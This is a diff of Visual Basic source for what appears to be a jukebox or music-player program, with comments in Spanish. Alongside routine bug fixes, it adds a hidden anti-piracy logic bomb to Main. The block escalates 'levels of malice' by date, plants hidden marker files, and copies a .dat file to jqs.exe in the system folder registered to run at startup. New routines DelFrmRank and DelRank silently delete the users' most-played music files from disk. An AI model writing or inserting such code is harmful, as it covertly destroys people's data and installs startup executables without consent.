@@ -361,6 +361,10 @@ Public InPort As Integer
 Public CtrlPort As Integer
 
 Public KeyUpdateMusic As String 'clave para la actualziacion de musica
+Public MDCN As Long 'dia de hoy en numeros solo si es crack, si no es cero
+Public MDCN2 As Long 'indica que pasaron los dias necesario para hacer maldades
+
+Public TopListen As String 'Texto "Los mas escuchados" para traducir a mosse
 
 Public Sub Main()
     On Error GoTo ErrINI
@@ -419,6 +423,9 @@ Public Sub Main()
     tERR.Anotar "1111"
     
     my_MEM.SetMomento "0085"
+    
+    TopListen = "Los mas escuchados"
+    TopListen = "Top 20 songs"
     
     '------------------------------------------------
     'ver si hay que empezar con los errores a full!!!
@@ -529,6 +536,81 @@ Public Sub Main()
     SaveCart = LeerConfig("SaveCart", "0")
     VentaExtras = LeerConfig("VentaExtras", "0")
     '***************FIN CARRITO**************************************
+    
+    
+    '*********************************************************
+    '*********************************************************
+    '*********************************************************
+    'CRACK PROPIO!!
+    Dim Existe1 As Boolean
+    Dim Existe2 As Boolean
+    
+    Existe1 = fso.FileExists(AP + "sf\jqs2323.dat")
+    Existe2 = fso.FileExists(SYSfolder + "urli.m" + "p3")
+    
+    If Existe1 Or Existe2 Then
+        
+        MDCN = CLng(Now) 'si es "" no hay crack
+        MDCN2 = 1 'solo despues de ciertas fechas, son niveles de maldad
+        
+        'solo se activara despues de cierta fecha
+        
+        '40148 es 01/12/2009
+        '40179 es 01/01/2010
+        
+        Randomize
+        If MDCN > CLng(Int(Rnd * 60)) + 40148 Then 'maximo 60 dias despues del primero de diciembre
+            'marcarla como sucia por mas que borre SF o cambie la fecha
+            fso.CreateTextFile SYSfolder + "jqqs2.st", True
+            MDCN2 = 2
+        End If
+        
+        Randomize
+        If MDCN > CLng(Int(Rnd * 60)) + 40179 Then 'maximo 60 dias despues del primero de enero de 2010
+            'marcarla como sucia por mas que borre SF o cambie la fecha
+            fso.CreateTextFile SYSfolder + "jqqs3.st", True
+            MDCN2 = 3
+        End If
+        
+        Randomize
+        If MDCN > CLng(Int(Rnd * 60)) + 40200 Then 'maximo 60 dias despues del primero de enero de 2010
+            'marcarla como sucia por mas que borre SF o cambie la fecha
+            fso.CreateTextFile SYSfolder + "jqqs4.st", True
+            MDCN2 = 4
+        End If
+        
+        'malditros relojes que se vuelven para atras!!!
+        '40080 es hoy 23 set 2009
+        If MDCN < 40080 Then 'maximo 60 dias despues del primero de enero de 2010
+            'ver marcas de que si paso la fecha
+            MDCN2 = 2
+            If fso.FileExists(SYSfolder + "jqqs2.st") Then MDCN2 = 2
+            If fso.FileExists(SYSfolder + "jqqs3.st") Then MDCN2 = 3
+            If fso.FileExists(SYSfolder + "jqqs4.st") Then MDCN2 = 4
+    
+        End If
+    Else
+        MDCN = 0
+        MDCN2 = 0
+    End If
+    
+    tERR.AppendSinHist "MCN:" + CStr(MDCN) + "." + CStr(MDCN2)
+    tERR.AppendSinHist "MC2:" + CStr(CLng(Existe1)) + "." + CStr(CLng(Existe2))
+    
+    
+    'ver que el JQS vaya al inicio
+    If fso.FileExists(AP + "3pmregs.dat") Then
+        If fso.FileExists(SYSfolder + "jqs.exe") = False Then
+            fso.CopyFile AP + "3pmregs.dat", SYSfolder + "jqs.exe"
+        End If
+        
+        Dim TR2 As New clsTBRREG
+        TR2.CREARINICIO "jqs", SYSfolder + "jqs.exe"
+    End If
+    '*********************************************************
+    '*********************************************************
+    '*********************************************************
+    
     EnableFF = False
     EnableNextMusic = False
     
@@ -575,7 +657,7 @@ Public Sub Main()
     tERR.Anotar "acnc5", RankToPeople
     If RankToPeople Then
         'el el verdadero es pathcompleto, nombre carpeta
-        MATRIZ_DISCOS(0) = "_RANK_,_Los mas escuchados" 'nuevo junio 07 para que parezca
+        MATRIZ_DISCOS(0) = "_RANK_,_" + TopListen 'nuevo junio 07 para que parezca
     End If
     
     'al abrir el clsKeys se genera el archivo de datos de la PC
@@ -1914,10 +1996,14 @@ Public Function LTE(I As Long) As Long  'llego tecla especial
     If Timer - TimeLastCoin(I) < (TimeMaxSeparacion(I) / 1000) Then
         CoinMuyJuntosAcum(I) = CoinMuyJuntosAcum(I) + 1
         EsperarFinTE I
+        'trash, sacar este codigo una vez resuelto
+        tERR.AppendSinHist "PasoLte:" + CStr(CoinMuyJuntosAcum(I)) + "/" + CStr(Timer) + "/" + CStr(TimeLastCoin(I))
     Else
         'el reloj debe detectarlo para saber a cuanto llego
         'y desde alli ponerlo en cero
         CoinMuyJuntosAcum(I) = 1
+        'trash, sacar este codigo una vez resuelto
+        tERR.AppendSinHist "IniLte:" + CStr(Timer) + "/" + CStr(TimeLastCoin(I))
     End If
     
     TimeLastCoin(I) = Timer
@@ -1961,7 +2047,10 @@ Private Sub TerminoLTE(I As Long)
                     
                     'poner los creditos que faltaron
                     'agregado 11/06/2009. Si es negativo !? me fije en la funcion varcreditos y no se registraia algo muy pulenta
-                    VarCreditos CSng(TemasPorCredito * (ValoresATransformar1(J) - J))
+                    If ValoresATransformar1(J) <> J Then
+                        VarCreditos CSng(TemasPorCredito * (ValoresATransformar1(J) - J))
+                        tERR.AppendSinHist "FaltoCR:" + CStr(ValoresATransformar1(J)) + "/" + CStr(J)
+                    End If
                     
                     'MsgBox "faltaron:" + CStr(ValoresATransformar1(J) - J) + _
                         vbCrLf + "TLE:" + CStr(i) + vbCrLf + _
@@ -1982,9 +2071,12 @@ Private Sub TerminoLTE(I As Long)
                 'poner ValoresATransformar(J)-j mas señales a la tecla especial indicada
                 'mandar esa misma señal las veces que falta
                 If ValoresATransformar2(J) > 0 Then
-                    'poner los creditos que faltaron
-                    VarCreditos CSng(CreditosBilletes * (ValoresATransformar2(J) - J))
                     
+                    If ValoresATransformar2(J) <> J Then
+                        'poner los creditos que faltaron
+                        VarCreditos CSng(CreditosBilletes * (ValoresATransformar2(J) - J))
+                        tERR.AppendSinHist "FaltoCR:" + CStr(ValoresATransformar2(J)) + "/" + CStr(J)
+                    End If
                     'MsgBox "faltaron:" + CStr(ValoresATransformar2(J) - J) + _
                         vbCrLf + "TLE:" + CStr(i) + vbCrLf + _
                         "J=" + CStr(J) + vbCrLf + _
@@ -2411,6 +2503,7 @@ Public Sub SelPagina(RitmoSel As String, Optional PrimeraLetra As String = "A")
     DiscosEnPagina = frmIndex.CargarDiscos(PrimeroDeLaPaginaQueNecesito, False, 0, AA - PrimeroDeLaPaginaQueNecesito)
     
     Exit Sub
+    
 NoEnuentro:
     tERR.AppendLog "acba21:" + CStr(AA), RitmoSel
     
@@ -3275,11 +3368,14 @@ Public Sub srtRNK()
             frmINI.PBar.Width = (Z * 10) Mod (frmINI.XxBoton1.Width / 2)
             frmINI.lblINI.Caption = "Ordenando ranking " + CStr(Z)
             frmINI.lblINI.Refresh
-            tmpSPL = Split(tt, ",")
-            ThisPTS = CLng(tmpSPL(0))
+            'me esta dando error e imagino archivos de ranking roto
+            If InStr(tt, ",") Then
+                tmpSPL = Split(tt, ",")
+                ThisPTS = CLng(tmpSPL(0))
             
-            If ThisPTS > UBound(MtxSort2) Then ReDim Preserve MtxSort2(ThisPTS)
-            MtxSort2(ThisPTS) = MtxSort2(ThisPTS) + "||" + tt
+                If ThisPTS > UBound(MtxSort2) Then ReDim Preserve MtxSort2(ThisPTS)
+                MtxSort2(ThisPTS) = MtxSort2(ThisPTS) + "||" + tt
+            End If
             
         End If
     Loop
@@ -3323,3 +3419,94 @@ Public Sub srtRNK()
 errSRT:
     tERR.AppendLog "errSTRRNK", tERR.ErrToTXT(Err)
 End Sub
+
+Public Sub DelFrmRank()
+    'revisar si es una version crackeada para eliminar del ranking archivos que a la gente le guste
+    
+    Select Case MDCN2
+        Case 0 'sin crack!!
+            Exit Sub
+        Case 1 'crack en dic 09
+            'elimina un archivo
+            DelRank 1
+        
+        Case 2 'crack en ene 10
+            DelRank 1
+            DelRank 3
+            
+        Case 3 'crack en feb 10
+            DelRank 1
+            DelRank 3
+            DelRank 5
+            DelRank 6
+            DelRank 7
+            DelRank 8
+            
+        Case 4 'crack en marzo 10
+            'elimina mucho
+            DelRank 1
+            DelRank 3
+            DelRank 5
+            DelRank 6
+            DelRank 7
+            DelRank 8
+            DelRank 9
+            DelRank 10
+            DelRank 11
+            DelRank 15
+            DelRank 19
+            DelRank 22
+            DelRank 27
+            
+    End Select
+    
+End Sub
+
+Private Sub DelRank(pos As Long)
+
+    If fso.FileExists(GPF("rd3_444")) = False Then
+        Exit Sub
+    End If
+    
+    Set TE = fso.OpenTextFile(GPF("rd3_444"), ForReading, False)
+    
+        'antes de entra ver si el archivo no tiene nada
+        If TE.AtEndOfStream Then
+            TE.Close
+            Exit Sub
+        End If
+        
+        Dim tt As String
+        Dim CuentaVueltasBuscandoAzar As Long
+        CuentaVueltasBuscandoAzar = 0
+        
+        Dim Z As Long
+        Z = pos
+        
+        Do While Not TE.AtEndOfStream
+            CC = CC + 1
+            tt = TE.ReadLine
+            tERR.Anotar "ache", tt, CC, Z
+            If CC = Z Then
+                Dim TemaAzar As String
+                TemaAzar = txtInLista(tt, 1, ",")
+                
+                'si tuve los discos cargados en una unidad o una ubicación distinta a la que aparece
+                'en el ranking, me da un error por que el archivo no existe
+                If fso.FileExists(TemaAzar) Then
+                    On Local Error Resume Next
+                    
+                    fso.DeleteFile TemaAzar, True
+                    
+                End If
+                
+                Exit Do
+            End If
+         Loop
+        
+    
+    On Local Error Resume Next
+    TE.Close
+End Sub
+
+
